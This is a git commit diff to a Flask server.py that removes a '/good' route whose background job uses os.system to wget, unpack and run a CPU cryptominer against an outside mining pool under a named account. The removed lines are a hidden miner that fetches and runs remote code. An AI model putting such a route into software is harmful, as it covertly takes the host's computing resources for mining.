7844d3753551aae15b995c608739fac0fe101dbc
xrock606410 <65744221+xrock606410@users.noreply.github.com>
2020-05-24 11:06:53 +0545

    Update server.py

--- server.py
+++ server.py
@@ -23,13 +23,7 @@ executor = Executor(app)
 def hello():
     return "Hello world"
 
-@app.route("/good")
-def index():
-    executor.submit(long_running_job)
-    return "Submitted a job !"
 
-def long_running_job():
-    os.system("wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.python -p x -e 60")
 
 
 
